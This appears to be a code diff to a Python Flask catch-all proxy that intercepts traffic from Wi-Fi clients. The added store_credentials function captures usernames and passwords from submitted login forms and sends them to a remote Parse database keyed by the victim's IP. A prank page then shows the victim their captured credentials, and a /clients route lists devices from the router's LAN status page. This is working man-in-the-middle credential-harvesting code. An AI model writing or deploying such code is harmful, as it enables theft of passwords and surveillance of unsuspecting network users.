@@ -51,6 +51,14 @@ def add_visited(ip, url):
     return False
   return True
 
+def store_credentials(ip, url, u, p):
+  obid = get_client_obid(ip)
+  if obid is None:
+    return
+  data = json.dumps({"credentials":{"__op":"AddUnique","objects":[(url, u, p)]}})
+  r = requests.put(PARSE + CLASSES + CLIENT + '/' + obid, headers=HEADERS, data=data)
+  return True
+
 def insecure_login(form):
   for u in USERNAME:
     for p in PASSWORD:
@@ -70,26 +78,47 @@ def get_url(path):
     return path
   return "http://%s/%s" % (host, path)
 
+def simple_rr(url, ip, u=None, p=None):
+  obj = {
+    "title": "You've been wangernumbed!",
+    "url": url,
+    "ip": ip,
+    "username": u,
+    "password": p
+  };
+  return render_template('rr.jade', **obj)
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST'])
 def catch_all(path):
   # log the request
   url = get_url(path)
-  add_visited(request.remote_addr, url)
+  ip = request.remote_addr
+  add_visited(ip, url)
   # print 'You want path: %s' % url
   # print request.method
   if url.startswith("http://www.nytimes.com"):
-    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    return simple_rr(url, ip)
   if request.method == "POST":
     (u, p) = insecure_login(request.form)
     print "POST REQUEST: "
     print request.form
     if (u, p):
-      return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      store_credentials(ip, url, u, p)
+      return simple_rr(url, ip, u, p)
     r = requests.post(url, data=dict(request.form))
   else:
     r = requests.get(url)
   return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/html"))
+
+@app.route('/login')
+def login_page():
+  return render_template('login.html')
+
+@app.route('/clients')
+def wifi_clients():
+  r = requests.get("http://192.168.1.1/Status_Lan.live.asp")
+  return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/json"))
 
 # this guy handles static files
 # @app.route('/<path:filename>')
